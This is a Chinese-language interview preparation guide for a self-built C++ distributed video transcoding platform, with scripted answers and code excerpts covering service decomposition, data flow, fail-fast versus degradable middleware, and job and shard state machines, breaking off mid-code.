## 一、30 秒版（用于「简单说说你的项目」）

> 这是一个基于**自研 C++ 网络库和 RPC 框架**实现的**分布式视频处理与资源调度平台**。
> 用户提交一个视频转码任务，平台会先用 ffprobe 探测真实时长，把视频**按时间切成多个 shard**，通过**资源感知调度**分发给多个 Worker 并行转码，最后把结果**合并**成完整视频。
> 整个过程中有 Worker 注册心跳、失败重试、故障迁移、进度上报、结果聚合、持久化和可观测性。
> 三层都是我自己写的：网络库 → RPC 框架 → 业务平台。

## 二、2 分钟版（用于「详细介绍一下」）

> **【一句话定位】**
> 这是一个从零实现的 Linux C++ 分布式视频处理平台，**三层递进**：底层是一个自研的 Reactor 网络库，中间是基于它的 RPC 框架，上层是用这个框架搭的分布式视频转码平台。
>
> **【为什么这么分层】**
> 我做这个项目的出发点是**理解一条完整的纵深链路**——从 epoll 事件循环，到 RPC 协议设计，到分布式任务调度。所以每一层都是前一层的直接用户：网络库被 RPC 框架用，RPC 框架被业务平台用。**这样任何一层的设计缺陷都会在上一层暴露出来**，逼着我回去改。
>
> **【上层业务做了什么】**
> 平台拆成 5 个微服务：JobService 管任务提交和查询，SchedulerService 负责时长探测、shard 切分和调度分配，WorkerManager 管 Worker 注册和心跳，TranscodeWorker 是真正跑 FFmpeg 的执行节点（可以横向扩容），ResultCollector 收集结果、触发合并、判定任务终态。
>
> 一次完整链路是：提交任务 → ffprobe 探测 → 切成 N 个 shard → 按 `score = 空闲槽×10 − CPU×0.5 − 内存×0.2` 打分选 Worker → Worker 用 FFmpeg 切片+转码一 pass 完成 → 结果上报 → 全部成功后用 concat demuxer 合并出成品。
>
> **【技术上比较硬的部分】**
> 三块。
> 第一是**故障恢复**：Worker 在执行中被 kill、Scheduler 崩溃重启、结果上报失败、重复上报——每一种都有明确的兜底路径，最终收敛到「shard 重置为 WAITING 重新调度」。
> 第二是**幂等**：用 `attempt_id` 作为「执行代次」，让「MQ 重投、RPC 重试、进程重启」都不会产生双份执行——**at-least-once 的投递通道，恰好一次的业务生效**。
> 第三是**状态一致性**：所有状态推进都走单条 `UPDATE ... WHERE id=? AND status IN (前置状态)`，用 MySQL 的行级原子性做 CAS，防止旧快照覆盖新状态。
>
> **【中间件都是真的】**
> MySQL 做持久化（唯一数据源），Redis 做 Worker 负载快照和分布式锁，RabbitMQ 做事件驱动调度（把调度延迟从 ~1 秒降到 **33 毫秒**），还自研了一套 Prometheus 格式的指标库做可观测性。**关键是每个中间件都有降级路径**——Redis 挂了回退 RPC、MQ 挂了回退轮询，只有 MySQL 是 fail-fast。
>
> **【验证】**
> 单元测试 43/43 通过；echo 压测在 500 并发下跑到 **101 万 QPS**；RPC 长连接 84.7 万 QPS；全链路实测 30 秒视频切成 2 个 shard 并行转码，合并产物时长 **30.02 秒**帧精确；故障注入实测 worker 转码中被 kill 能自动恢复。
> 还做了 Docker Compose 一键启动（9 个容器）和 CI 流水线，CI 里跑真实的端到端集成测试。

## 四、高频开场追问（4 个必背）

### 追问 1：为什么不直接用现成框架？

**答**：

> **生产环境我会优先用成熟框架**——gRPC、brpc 这些有完整的超时/重试/负载均衡/多语言支持，经过大规模验证，自研 RPC 在生产上几乎总是错误选择。
>
> **但这个项目的目标不是「做一个能用的框架」，而是「理解底层机制」**。用现成框架的话，「怎么切分消息边界」「怎么找到服务」「超时语义是什么」这些问题全都被框架藏起来了——而这些问题恰恰是最有价值的架构决策。
>
> 而且自研带来一个现成框架给不了的优势：**网络库和 RPC 是一起设计的**，所以我可以把「长度前缀帧」的认知下沉到网络层（`MessageCodec`），让应用层不用写拆包代码。用通用框架的话这层是黑盒。
>
> 最后，**业务平台的作用是验证框架**——5 个微服务跑起来，才能暴露「ZK 同步调用会无限阻塞」「MQ 消费会锁死」这些真实问题。

**⚠️ 千万不要说**：「我觉得现成框架不好」或「自己写的性能更好」——这是**减分项**，显得没有工程判断。

### 追问 2：为什么选视频处理这个业务？

**答**：

> 三个理由。
>
> **第一，视频转码天然可以切片并行**。一段 60 秒的视频切成 4 个 15 秒的 shard，每个 shard 独立转码，最后合并——**这是分布式任务调度最理想的形态**（可切分、无依赖、可并行）。
>
> **第二，任务耗时足够长**（几十秒到几分钟），所以**故障恢复、进度上报、超时检测这些机制才有意义**。如果任务只要 10 毫秒，重试和迁移根本来不及体现价值。
>
> **第三，结果可验证**。合并出来的视频时长必须是 30.02 秒（2 个 15 秒 shard）——**这个用 ffprobe 一测就知道对不对**。如果切片有重叠或者丢失，时长立刻不对。这是「结果可验证」的工程价值。

**⚠️ 不要展开音视频技术**。如果面试官追问「音视频你懂多少」，标准答法：

> **项目不以编解码算法为重点。** 我掌握的是**工程概念**——容器格式、编码格式、分辨率、码率、帧率、切片、转码、合并这些，实际编解码完全交给 FFmpeg 命令行。
> 平台的**重点是分布式调度和执行管理**——怎么切分、怎么分配、怎么故障恢复、怎么保证幂等。我没有去研究 H.264 的宏块、运动估计这些，那是另一个专业方向。

**这个回答「主动划界」而不是「硬撑」，反而是成熟的信号。**

### 追问 3：这个项目最难的点是什么？

**答**：三个，按难度排序。

> **第一是任务状态一致性**。Worker 可能执行失败、超时、重复上报、上报后自己挂了——**这些情况都会让「任务到底进行到哪了」变得模糊**。
> 我的解法是**双状态机 + 条件更新 + 执行代次**：Job 和 Shard 各有状态机，所有状态推进都用 `UPDATE ... WHERE status IN (前置)` 做 CAS，再用 `attempt_id` 标记执行代次让旧结果自动失效。
>
> **第二是故障恢复的收敛性**。五类故障（执行失败、进程退出、上报超时、重复上报、Scheduler 重启）最终都要收敛到同一个动作：**把 shard 重置为 WAITING 重新调度**。我让所有恢复路径复用同一套分配逻辑，这样不会出现「不同故障走出不同行为」。
>
> **第三是框架的可用性**。原始的 RPC 框架只有同步短连接，连不上就完蛋。我在业务压力下给它补了长连接池、超时、结构化错误码、服务发现缓存、deadline 透传——**这些能力全是被业务倒逼出来的，不是为了炫技**。

### 追问 4：如果让你扩展，你会怎么做？

**答**：

> **最先做的是把单点变成集群**。目前 Scheduler 和 ResultCollector 都是单实例，是明确的单点。Scheduler 可以按 `job_id` 哈希分片，或者做主备选主；ResultCollector 同理。
>
> **其次是 WorkerManager 分区**。现在所有 Worker 的心跳都打到一个 WM 上，Worker 上千之后 WM 会成为瓶颈——可以按 worker_id 范围分区管理。
>
> **然后是存储**。MySQL 现在是单实例，`jobs`/`shards` 两张表会持续增长，可以按时间分表或者分库。
>
> **再往后是文件的处理方式**。现在 shard 的输入输出都是**本地路径**，这意味着所有 Worker 必须能访问同一个文件系统。要在多机部署，得把大文件挪到**对象存储**——RPC 只传元数据（路径、参数、状态），**绝不能让 RPC 传大文件**。
>
> **最后是调度策略**。现在的评分是静态权重（`slots*10 - cpu*0.5 - mem*0.2`），可以引入历史执行时间做预测性调度——比如「这个 Worker 在 1080p 转码上平均比别人快 20%」，给它更高权重。

## 一、平台架构与微服务拆分

### Q1.1 为什么要拆成 5 个服务？拆分依据是什么？

**答（30 秒口述版）**

**按「职责不同、扩缩容需求不同、生命周期不同」三个维度拆的。**

```text
Client/CLI ──SubmitJob──► JobService ──ScheduleJob──► SchedulerService
                                                          │
                                             ListWorkers  │  AssignShard
                                                          ▼
                            WorkerManager ◄──────── TranscodeWorker
                                  ▲                        │
                                  │                        │ ReportResult
                                  └── Heartbeat            ▼
                                                   ResultCollector
```

| 服务 | 端口 | 职责 | 扩缩容特征 |
|---|---|---|---|
| **JobService** | 9001 | 任务提交/查询/取消，任务主状态入口 | 无状态，可水平扩 |
| **SchedulerService** | 9002 | 时长探测、shard 切分、调度分配、失败重试 | **有状态（调度决策）** |
| **WorkerManager** | 9003 | Worker 注册、心跳、负载上报 | 无状态 |
| **TranscodeWorker** | 9004+ | 真实 FFmpeg 转码执行 | **计算密集，按需扩容** |
| **ResultCollector** | 9005 | 收集结果、触发合并、判定终态 | 有状态（合并决策） |

**拆分的三个依据**：

**① 扩缩容需求不同**。`TranscodeWorker` 是**唯一计算密集**的服务，需要按负载横向扩容（`docker compose up -d --scale transcode_worker=3`）。其他四个都是控制面的轻量服务。**如果把它们塞进一个进程，扩 Worker 就得把控制面也复制一份**——而控制面是**有状态**的，复制会引入一致性问题。

**② 故障域隔离**。`TranscodeWorker` 会 fork 子进程跑 FFmpeg，**子进程崩溃、OOM、被 SIGKILL 都是常态**。如果和 Scheduler 在一个进程里，**一个转码进程的崩溃可能拖垮整个调度器**。分开之后，Worker 挂了只会被重新调度，Scheduler 不受影响。

**③ 职责单一、便于理解**。每个服务只是「一类资源的一个管理面」——任务管理、调度决策、Worker 管理、执行、结果聚合。**每个服务的 `main()` 长得几乎一样**（见 Q1.3），**心智负担低**。

**面试官想听什么**

- 能说清「`TranscodeWorker` 是唯一需要横向扩容的」这个**核心拆分依据**
- 能说出「控制面 vs 计算面」的分离
- 知道**故障域隔离**（FFmpeg 子进程崩溃不该拖垮调度器）

**可能追问**

- Q1.1.1 那 Scheduler 和 ResultCollector 为什么不能合并？

#### Q1.1.1 那 Scheduler 和 ResultCollector 为什么不能合并？

**答**：**因为它们处在任务生命周期的两端——一个是「入口」，一个是「出口」，合并会引入循环依赖。**

**看数据流向**：

```text
提交 → JobService → Scheduler（切分 + 分配）→ Worker（执行）→ ResultCollector（聚合 + 终态）
                        ↑                                            │
                        └──────── 需要通知「任务已终态」──────────────┘
```

**注意那条反向箭头**：ResultCollector 判定任务终态后，**必须通知 Scheduler**（让 Scheduler 停止调度这个任务的残留 shard）。

如果合并成一个服务，这个「反向通知」就变成了**进程内调用**——听起来更简单，但会带来三个问题：

**① 职责耦合**。Scheduler 的核心逻辑是「**把 shard 分出去**」，RC 的核心逻辑是「**把结果收回来**」——它们操作的数据结构、关心的状态、性能特征都不同。Scheduler 是**高频轮询**（2~5 秒一轮），RC 是**事件驱动**（每次结果上报触发）。合并后要在一个进程里跑两种节奏。

**② 单点故障的影响面变大**。分开的话，Scheduler 挂了 → 任务停止调度（但已在执行的会完成）；RC 挂了 → 结果收不回来。合并的话，**任意一个问题都会让「调度」和「聚合」同时失效**。

**③ 事务边界模糊**。现在「shard 状态推进」和「job 终态判定」是两个服务的 CAS 操作，边界清晰。合并后，一个函数里既改 shard 又改 job，**很容易写出「改了一半失败」的中间态**。

**但反过来，我要承认合并有一个真实的好处**：**「任务终态时通知 Scheduler 取消残留 shard」这个跨服务 RPC，目前是 best-effort 的**——`MarkJobTerminal` 里失败只打 WARN。如果合并成进程内调用，这个通知就变成可靠的（同步调用必然成功）。

**所以这是个取舍**：我选了「职责清晰 + 故障隔离」，代价是「终态通知是 best-effort 的，需要靠各处的终态检查兜底」。

**而且我确实做了多层兜底**：Scheduler 的分配循环、超时重扫、Worker 离线处理**三处都加了 job 终态检查**——即使那次 RPC 通知丢了，Scheduler 在处理这些 shard 时也会发现「job 已经终态了」，然后标 CANCELED。**跨服务通知是「快路径」，终态检查是「兜底路径」。**

**面试官想听什么**

- 能看出「反向通知」这个**隐含的依赖方向**
- 能说清合并的**好处**（通知变成可靠的）和**代价**（职责耦合、故障面变大）
- 知道兜底机制弥补了 best-effort 通知的不可靠

### Q1.2 数据在服务之间是怎么流动的？

**答（30 秒口述版）**

**核心原则：每个数据只有一个「写者」，其他服务通过 RPC 或数据库读。**

**三个阶段的数据流**：

**① 提交阶段**：

```text
Client → JobService.SubmitJob
  ├─ 生成 job_id，写 MySQL（status = PENDING）
  └─ 同步调 Scheduler.ScheduleJob（最多重试 3 次）
       ├─ 全局互斥锁（防并发切分）
       ├─ 幂等早退（已有 shard 就直接返回计划）
       ├─ ffprobe 探测真实时长
       ├─ 算 shard 数，逐条 INSERT shards 表（status = WAITING）
       ├─ job.status = SCHEDULING
       └─ 为每个 shard 发布 MQ 事件
```

**② 执行阶段**：

```text
Scheduler.SchedulingLoop / MqConsumeLoop
  ├─ ListByStatus(WAITING) 拿待分配 shard
  ├─ 按 job 优先级排序
  ├─ LoadOnlineWorkers（Redis 快照优先，回退 ListWorkers RPC）
  ├─ 打分选 Worker（score = slots*10 - cpu*0.5 - mem*0.2）
  ├─ SETNX 分布式锁
  ├─ 直连 Worker.AssignShard
  └─ shard.status = RUNNING（条件更新）

Worker
  ├─ fork+exec FFmpeg 转码（切片+转码一 pass）
  ├─ 进度写本地原子变量（Scheduler 主动 QueryShard 拉取）
  └─ ReportShardResult（MQ 优先，回退直连 RPC 重试 3 次）
```

**③ 聚合阶段**：

```text
ResultCollector.HandleReportShardResult（RPC 和 MQ 两条路径共用）
  ├─ 取 shard，校验 attempt_id（拒绝旧代次的结果）
  ├─ 幂等检查（已 SUCCESS / 同 attempt 重复上报）
  ├─ 条件更新 shard 状态
  ├─ 失败 → 调 Scheduler.RescheduleShard 触发重试
  └─ CheckJobDone → 全部 SUCCESS → MarkJobTerminal
       ├─ job.status = SUCCESS
       ├─ 按 shard_index 排序，FfmpegExecutor::Merge 合并
       └─ 删除中间分片文件
```

**关键设计点：Worker 不直接改任务状态**。

**为什么**：如果 Worker 能改 job 状态，那就有**多个写者**——Scheduler 想改（调度时）、Worker 想改（执行时）、RC 想改（聚合时）。多写者必然需要协调，而协调的代价（锁、版本号、冲突处理）远超收益。

**改成单写者之后**：

| 数据 | 唯一写者 | 其他服务 |
|---|---|---|
| `jobs` 表的状态 | JobService（提交/取消）、Scheduler（SCHEDULING/RUNNING）、RC（终态） | 只读 |
| `shards` 表 | Scheduler（分配/重试/重置）、RC（SUCCESS/FAILED） | 只读 |
| Worker 心跳 | WorkerManager | Scheduler 只读（通过快照或 RPC） |

**注意 `jobs` 表其实有三个写者**——但因为**它们写的是不同的状态区间**（JobService 写 PENDING/CANCELED，Scheduler 写 SCHEDULING/RUNNING，RC 写 SUCCESS/FAILED），再配合**条件更新 CAS**，实际上不会冲突。

**面试官想听什么**

- 能按「提交 → 执行 → 聚合」三段说清数据流
- 知道 **Worker 不直接改任务状态**这个约束，以及它的原因（避免多写者）
- 能指出「job 表有多个写者，但写的是不同状态区间 + CAS 保证安全」

**可能追问**

- Q1.2.1 Worker 的进度为什么要 Scheduler 主动拉，而不是 Worker 推？

#### Q1.2.1 Worker 的进度为什么要 Scheduler 主动拉，而不是 Worker 推？

**答**：**因为推送的频率和拉取的频率需求差了几个数量级。**

**先看事实**：`worker.proto:13` 的注释写明了设计：

```proto
// 实时转码进度由 Scheduler 直连 Worker 的 QueryShard 获取，不经过本服务
```

**推模式的问题**：

FFmpeg 的 `-progress` 输出是**每 ~0.5 秒一行**。如果每个 shard 都推一次进度：

```text
每个 shard：2 次/秒
假设 100 个 shard 并发：200 次 RPC/秒
```

**而进度信息本身很小**（就一个 0~100 的整数），**推 200 次/秒完全是浪费**——而且这 200 次 RPC 会挤占正常的业务 RPC 资源。

**拉模式的好处**：

```text
Scheduler 只在「需要判断这个 shard 是不是卡死了」的时候才去查
  → 每次超时重扫（30 秒一次）对超时的 shard 查一次
  → 实际频率是「每个可疑 shard 每 30 秒一次」
```

**差了 60 倍**。

**而且拉模式有「按需」的优势**：**不关心的 shard 根本不查**。比如一个正常执行的 shard（没超时），Scheduler 完全不会去问它的进度——因为没必要。推模式做不到这点，因为 Worker 不知道 Scheduler 什么时候关心。

**还有一个更实际的考虑**：**进度不是关键路径**。

任务的成败由「结果上报」决定（`ReportShardResult`），进度只是**给人看的**和**给超时判定用的**。为一个非关键路径的数据建一条高频推送通道，性价比很低。

**⚠️ 但推模式在一个场景下是必须的**——**如果客户端要实时进度条**。这是「用户体验」需求，不是「系统正确性」需求。我删掉的 Qt GUI 客户端当时就是靠 2 秒轮询 `QueryJob` 来显示进度的（**轮询而不是推送**，所以也没触发这个问题）。如果将来真要做实时进度推送，正确的做法是**单独建一条轻量的推送通道**（比如 WebSocket 或 SSE），而不是复用 RPC。

**面试官想听什么**

- 能从**频率差异**（0.5 秒/次 vs 30 秒/次）论证拉模式的优势
- 知道进度**不在关键路径**上
- 能说出「什么时候需要推」（实时 UI），以及「该用什么做推」（专门的通道，不是 RPC）

### Q1.3 5 个服务的启动模式是一样的吗？

**答**：**几乎完全一样——这是刻意的。**

`job_service.cpp` 的 `main()`：

```cpp
int main(int argc, char** argv)
{
    // 1. 异步日志（最先，保证后面的失败也有日志）
    wevix_muduo::AsyncLogger::init("./program_log", wevix_muduo::LogLevel::INFO, true);

    // 2. 框架初始化
    if (!MprpcApplication::Init(argc, argv)) { ...; return EXIT_FAILURE; }

    // 3. MySQL（fail-fast：连不上必须拒绝启动）
    if (!MysqlPool::GetInstance().Init())
    {
        LOG_ERROR("MySQL init failed, refusing to start");
        return EXIT_FAILURE;
    }

    // 4. Redis（可降级：连不上只 WARN）
    RedisClient::GetInstance().Init();

    // 5. MQ（可降级）
    MqClient::GetInstance().Init();

    // 6. 起后台线程（PendingScanLoop / SchedulingLoop / MqConsumeLoop / 心跳…）
    std::atomic<bool> stop_flag{false};
    std::thread pending_thread(PendingScanLoop, std::ref(stop_flag));

    // 7. 注册服务 + 启动 RPC
    RpcProvider provider;
    provider.NotifyService(new JobServiceImpl());
    if (!provider.Run()) { ...; return EXIT_FAILURE; }

    // 8. 收尾
    stop_flag = true;
    pending_thread.join();
    metrics_server.Stop();
    wevix_muduo::AsyncLogger::GetInstance().stop();
    return 0;
}
```

**这个统一的骨架带来三个好处**：

**① 每个新服务的开发成本极低**。写一个新的微服务 = 复制这个骨架 + 实现 service 类。

**② 故障语义一致**。所有服务对「MySQL 连不上」都是 `EXIT_FAILURE`，对 Redis/MQ 都是「WARN 继续」。

**③ 排查路径一致**。看到任何一个服务起不来，排查顺序都是「日志 → MySQL → Redis/MQ → ZK」。

**但骨架里有几个容易忽略的细节**：

**① 异步日志必须最先初始化**——这样后面任何一步失败都能被打出来：

```cpp
// 1. 异步日志（最先，保证后面的失败也有日志）
wevix_muduo::AsyncLogger::init("./program_log", wevix_muduo::LogLevel::INFO, true);
```

**② MySQL 在 Redis/MQ 之前**——因为 MySQL 是 fail-fast 的，先检查它，连不上就别白连 Redis 了。

**③ 后台线程在 `provider.Run()` 之前起**——注意 `Run()` 是**阻塞**的（内部 `mainLoop_->run()`）。所以后台线程必须**先起**，否则永远起不来。

**④ `metrics_server.Start()` 的位置有讲究**（`transcode_worker.cpp:950-951` 的注释）：

```cpp
// 前面的失败路径不涉及 metrics 线程的启动/清理，保持每个失败分支只做日志清理
```

**意思是**：把 metrics 启动放在**所有配置校验和依赖检查之后**——这样如果前面的检查失败了，进程直接 `return EXIT_FAILURE`，**不需要清理 metrics 线程**（因为它还没起）。**每个失败分支只需要管自己之后申请的资源**。

**面试官想听什么**

- 能说清「统一骨架」的**工程价值**（新服务开发成本、故障语义一致、排查路径一致）
- 知道**初始化顺序是有讲究的**（日志最先、MySQL 先于 Redis/MQ、后台线程在阻塞调用之前）
- 知道 **metrics 启动放最后**是为了「失败分支不需要清理」

**可能追问**

- Q1.3.1 为什么 MySQL 是 fail-fast，Redis/MQ 却只 WARN？

#### Q1.3.1 为什么 MySQL 是 fail-fast，Redis/MQ 却只 WARN？

**答**：**因为这个判断的唯一依据是：「它挂了以后，系统还能不能回到挂掉之前的可用状态」。**

**这是引入任何中间件时都必须回答的问题**（`doc/设计问题/业务/13. MySQL与Redis中间件设计.md` 里写明了这条原则）。

**逐个分析**：

| 组件 | 定位 | 挂了会怎样 | 语义 |
|---|---|---|---|
| **MySQL** | **唯一数据源** | 所有 Store 操作失败 → 读写都不行 → 服务无法工作 | **fail-fast** |
| **Redis** | 读路径加速器 | 回退到 RPC 直查 / 降级放行（锁） | **可降级** |
| **MQ** | 事件通知通道 | 回退到轮询调度 / 直连 RPC 上报 | **可降级** |
| **metrics** | 观测 | 不影响任何功能 | **可降级** |

**MySQL 为什么必须 fail-fast**（`job_service.cpp:466-471`）：

```cpp
if (!MysqlPool::GetInstance().Init())
{
    LOG_ERROR("MysqlPool init failed, refusing to start");
    wevix_muduo::AsyncLogger::GetInstance().stop();
    return EXIT_FAILURE;
}
```

**因为它是阶段 9 之后所有 Store 的唯一数据源**。连不上 MySQL 意味着：
- `JobStore::Get` 返回空 → 看起来「任务不存在」；
- `UpdateIfStatus` 失败 → 状态推进不了；
- 服务「看起来在运行」，但**每个请求都会失败或给出错误答案**。

**这种「静默错误」比「拒绝启动」危险得多**——前者会让监控显示「服务正常」，而用户看到的是「任务提交不了」。

**Redis 为什么可以降级**（`redis_client.cpp:43-47`）：

```cpp
enabled_ = false;
LOG_WARN("RedisClient connect to %s:%d failed, degrade to local cache/RPC fallback "
         "(MySQL remains source of truth)", host_.c_str(), port_);
return false;
```

**注释里写得很清楚**：`MySQL remains source of truth`——Redis 只是**加速器**。

它承担两个职责（见第七节）：
1. **Worker 负载快照** → 挂了回退 `ListWorkers` RPC（每次调用重新判断，**恢复后自动切回**）；
2. **分布式锁** → 挂了**降级放行**，由 MySQL 条件更新兜底正确性。

**两者都有完整的替代路径**，所以不需要 fail-fast。

**MQ 为什么可以降级**：

MQ 承担两个职责：
1. **调度通知**（`job.events → shard.waiting`）→ 挂了回退 `SchedulingLoop` 轮询；
2. **结果上报通道**（`shard.events → result.pending`）→ 挂了回退直连 RPC 上报。

**关键设计是「双模并存」**：SchedulingLoop **从来没有被废弃**，它一直在跑，只是 MQ 在线时降频到 5 秒：

```cpp
bool mq_active = mq.inited() && mq.enabled() && mq.connected();
interval_ms = mq_active ? kScheduleIntervalMsIdle    // 5000ms
                        : kScheduleIntervalMs;       // 2000ms
```

**所以 MQ 挂掉不需要「切换」——本来就是两套机制并行，只是频率不同。** 这比「检测到故障再切换」可靠得多（因为没有切换的中间态）。

**⚠️ 这里有个我意识到的问题**：**MQ/Redis 的降级是「启动期」判断的**。如果服务启动时 Redis 就连不上，`enabled_` 被设为 `false` 后，**没有重连机制**——除了进程重启，它永远不会恢复。

**所以「MQ 恢复后调度自动切回 Push 模式」这句话只在「运行期掉线」的场景成立**，启动期就连不上是恢复不了的。**这是个真实的缺口**，我在审查里记录了。

**面试官想听什么**

- 能说出判断标准的**那句话**（「它挂了系统能否回到挂之前的可用状态」）
- 能对每个组件**具体说明降级路径是什么**
- 知道 MQ 降级的核心是「**双模并存**」而不是「故障切换」——没有切换的中间态

## 二、数据模型与状态机

### Q2.1 数据模型是怎么设计的？

**答（30 秒口述版）**

**三层实体：Job → Shard → Attempt，但 Attempt 不建表，挂在 Shard 上。**

```text
Job（一个转码任务）
 └─ 1 : N → Shard（视频的一个时间片段）
              └─ N : 1 → Attempt（这个 shard 的第几次执行）
```

**为什么 Attempt 不单独建表**——因为它是**执行代次**，只是 ShardRecord 上的一个字符串字段：

```cpp
// attempt_id 格式：{shard_id}_attempt_{retry_count}
// 例："job_xxx_shard_0_attempt_2"
```

**三层设计的目的**（`doc/设计问题/业务/10. job-shard-attempt设计.md` 里的原话总结）：

> **CAS 防「旧状态快照覆盖新状态」（状态版本），Attempt 防「旧执行结果干扰新执行」（执行代次）。**

**这是两个不同的维度**：

**Job / Shard 的「状态」解决「状态版本」问题**：

```text
线程 A：Get(shard) → status = WAITING      ← 快照
线程 B：把 shard 推进到 RUNNING              ← 并发的推进
线程 A：Update(shard)                       ← 用旧快照覆盖！RUNNING 被打回 WAITING
```

**解法**：状态推进必须带前置状态条件（`UpdateIfStatus`，见第六节）。

**Attempt 的「执行代次」解决「旧执行结果」问题**：

```text
shard_0 被分配给 Worker A（attempt_id = "shard_0_attempt_0"）
Worker A 卡住了，Scheduler 超时重扫 → 重置为 WAITING，retry_count++ 
   → 重新分配给 Worker B（attempt_id = "shard_0_attempt_1"）
此时 Worker A 缓过来了，上报结果（attempt_id = "shard_0_attempt_0"）  ← 旧代次！
```

**如果不校验 attempt**：Worker A 的**过期结果**会覆盖 Worker B 的**当前执行**——而 Worker B 还在跑，最后它的结果又会覆盖回来。**两次执行、状态来回横跳、产物可能被写坏**。

**有了 attempt 校验**（`result_collector.cpp:82-95`）：

```cpp
int stored_retry   = parseRetryFromAttempt(shard.attempt_id);
int incoming_retry = parseRetryFromAttempt(attempt_id);
if (!shard.attempt_id.empty() && incoming_retry < stored_retry)
{
    LOG_INFO("...: rejecting stale result for shard %s", ...);
    response->set_accepted(false);      // ← 旧代次的结果被拒绝
    return;
}
```

**「状态版本」和「执行代次」的区别**：

| | 状态版本（CAS） | 执行代次（attempt） |
|---|---|---|
| **防护对象** | 旧**快照**覆盖新**状态** | 旧**执行结果**干扰新**执行** |
| **失效条件** | 前置状态不匹配 | `attempt_id` 落后 |
| **粒度** | 每次状态推进 | 每次**重试**（`retry_count` 变化） |
| **实现** | `WHERE status IN (...)` | 字符串比较 |

**面试官想听什么**

- 能说清 **Job → Shard → Attempt 三层**，以及 Attempt 为什么不建表
- 能**区分**「状态版本」和「执行代次」这两个不同的防护维度——这是核心
- 能举出「Worker A 过期结果覆盖 Worker B」这个具体场景

**可能追问**

- Q2.1.1 为什么 `attempt_id` 用字符串而不是整数？

#### Q2.1.1 为什么 `attempt_id` 用字符串而不是整数？

**答**：**两个好处：不需要额外查询、日志可读。而它的代价（字符串比较、解析）在这个场景下可以忽略。**

**格式**（`scheduler_service.cpp:997`）：

```cpp
fresh.attempt_id = fresh.shard_id + "_attempt_" + std::to_string(fresh.retry_count);
// 例："job_1756..._shard_0_attempt_2"
```

**好处一：不需要额外 RPC 查询**。

如果 `attempt_id` 只是一个递增的整数，RC 收到结果时**不知道这个整数代不代旧**——它必须去查「这个 shard 当前的 attempt 是多少」。

而且更麻烦的是：**传输过程中需要多传一个字段**（`retry_count`），而 `retry_count` 和 `attempt_id` 是两个可能不一致的信息源。

**用字符串之后，`attempt_id` 里**内嵌**了 `retry_count`**——RC 直接解析就能比较：

```cpp
static int parseRetryFromAttempt(const std::string& attempt_id)
{
    // 取最后一个 '_' 之后的整数
    size_t pos = attempt_id.rfind('_');
    if (pos == std::string::npos) return 0;
    try { return std::stoi(attempt_id.substr(pos + 1)); }
    catch (...) { return 0; }
}
```

**好处二：日志可读**。

日志里出现 `rejecting stale result for shard job_xxx_shard_0 (incoming attempt retry=0 < stored retry=1)` 时，**一眼就能看出代次关系**。如果是两个裸整数 `(0 < 1)`，还得去查表才知道哪个是哪个。

**好处三：防「误以为相等」**。

`attempt_id` 是**全字符串比较**（隐式地通过解析出的数字比较），而不是只看 `retry_count`。如果哪天引入了「同一个 retry_count 但不同执行实例」的场景（比如 Scheduler 重启后重新分配），**字符串里的 `shard_id` 前缀能区分开**。

**代价是什么**：

1. **字符串拼接/解析的开销**——但这是在「每次重试」时发生，不是每次请求，**频率极低**；
2. **依赖字符串格式**——如果格式变了（比如改成用 `-` 分隔），`rfind('_')` 就崩了。**这是个隐藏的耦合**。

**⚠️ 这个耦合确实出过问题**：审查里发现 `parseRetryFromAttempt` 在解析失败时**静默返回 0**：

```cpp
catch (...) { return 0; }        // ← 解析失败 = retry 0
```

如果格式变了导致全部解析成 0，那么 `incoming_retry < stored_retry` **永远不成立**——**stale 保护整体失效，而且是静默失效**（没有任何日志）。

**正确的做法**是解析失败时打 WARN 或者返回一个「无效」的哨兵值，让调用方区别处理。

**所以如果用整数**：好处是「比较明确、不依赖格式」，坏处是「需要多传一个字段 + 日志不可读」。**如果要重构，我会用「显式的 `retry_count` 字段 + 一个 `execution_id`」的组合**——前者用于比较，后者用于区分实例。但当时选字符串是为了「少一个字段、日志清楚」，这个取舍我仍然认为合理。

**面试官想听什么**

- 能说出「字符串内嵌 retry_count，避免额外查询」这个**主要动机**
- 知道「日志可读性」在生产排查中的实际价值
- 能**主动指出**「依赖格式 + 解析失败静默返回 0」这个真实的耦合风险

### Q2.2 Job 和 Shard 的状态机是怎么流转的？

**答（30 秒口述版）**

**两个独立的状态机，各有自己的流转规则。**

**Job 状态机**（`common.proto:13-21`）：

```text
JOB_PENDING(1) → JOB_SCHEDULING(3) → JOB_RUNNING(4) → JOB_SUCCESS(6)
                                                   ↘ JOB_FAILED(7)
                     任意状态 → JOB_CANCELED(8)
```

**Shard 状态机**（`common.proto:29-38`）：

```text
SHARD_WAITING(2) → SHARD_RUNNING(4) → SHARD_SUCCESS(5)
                          ↘ SHARD_FAILED(6) → SHARD_RETRYING(7) → WAITING
                          ↘ (重试超次) → SHARD_FAILED
                任意状态 → SHARD_CANCELED(8)
```

**注意枚举值有断号**（`common.proto:10-12` 和 `:24-28` 的注释解释了）：

```proto
// JobStatus：缺少 2 和 5
// 「合并是 ResultCollector.MarkJobTerminal 内同步完成，无独立 MERGING 状态」

// ShardStatus：缺少 1
// 「shard 创建即 WAITING；分配成功即 RUNNING，无独立 ASSIGNED/CREATED 停留」
```

**「无独立 MERGING 状态」是个刻意的设计**：合并是 `MarkJobTerminal` 里**同步完成**的一步（`FfmpegExecutor::Merge` 是阻塞调用），如果给它一个状态，就会出现「任务卡在 MERGING」的中间态——而合并本身很快（concat demuxer + `-c copy`，秒级），**不值得为它引入一个可观测的中间态**。

**枚举值不重排**是**向后兼容**的要求——已经落库的 shard 记录里存的是数字，重排会改变历史数据的语义。

**状态流转的规则**：

**① 所有推进都是「条件更新」**（`UpdateIfStatus`）。

**② 终态是单向的**。`MarkJobTerminal` 里有一个**单调性检查**（`result_collector.cpp:332-356`）：

```cpp
// 状态单调性检查：只接受状态升级
if (static_cast<int32_t>(status) > job.status)
{
    int from_status = job.status;
    job.status = static_cast<int32_t>(status);
    JobStore::GetInstance().UpdateIfStatus(job_id, {from_status}, job);
}
```

**依赖枚举值的大小关系**：`SUCCESS=6 < FAILED=7 < CANCELED=8`。

所以 **CANCELED 之后不会被 SUCCESS 覆盖**（`6 > 8` 为假）——这个「用枚举值大小当优先级」的技巧，**要求枚举值的设计本身就体现优先级**。这也是「枚举值不重排」的另一个理由。

**③ 判定规则在 ResultCollector**（`CheckJobDone`）：

```cpp
// 判定 JOB_SUCCESS：所有预期 shard 都 SUCCESS
if (success_count >= expected_shard_count)
{
